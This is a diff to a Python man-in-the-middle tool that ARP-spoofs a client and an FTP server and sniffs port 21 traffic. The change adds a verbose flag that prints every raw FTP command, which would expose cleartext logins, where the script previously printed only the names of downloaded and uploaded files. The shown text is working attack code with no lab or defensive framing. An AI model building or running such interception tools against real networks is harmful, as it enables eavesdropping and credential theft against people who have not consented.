@@ -15,17 +15,17 @@ def arp_spoof(client_ip, client_mac, server_ip, server_mac):
         send(arp_response2, verbose=False)
         time.sleep(1)
 
-def capture_ftp_traffic(pkt):
+def capture_ftp_traffic(pkt, verbose):
     if pkt.haslayer('TCP'):
         if pkt['TCP'].dport == 21 or pkt['TCP'].sport == 21:
             if pkt.haslayer('Raw'):
                 data = pkt['Raw'].load.decode(errors='ignore')
-                if data.startswith('RETR'):
+                if verbose:
+                    print(data)
+                elif data.startswith('RETR'):
                     print("File download = " + data.split()[1])
                 elif data.startswith('STOR'):
                     print("File upload = " + data.split()[1])
-                else:
-                    print(data)
 
 def main():
 
@@ -34,6 +34,7 @@ def main():
     parser.add_argument("client_mac", help="client MAC address")
     parser.add_argument("server_ip", help="server IP address")
     parser.add_argument("server_mac", help="server MAC address")
+    parser.add_argument("-v", "--verbose", help="view all cmd", action="store_true")
     
     args = parser.parse_args()
 
@@ -43,7 +44,7 @@ def main():
 
     # Sniffer le trafic FTP
     try:
-        sniff(filter="tcp port 21", prn=capture_ftp_traffic, stop_filter=lambda x: stop_event.is_set())
+        sniff(filter="tcp port 21", prn=lambda pkt: capture_ftp_traffic(pkt, args.verbose), stop_filter=lambda x: stop_event.is_set())
     except KeyboardInterrupt:
         pass
     finally:
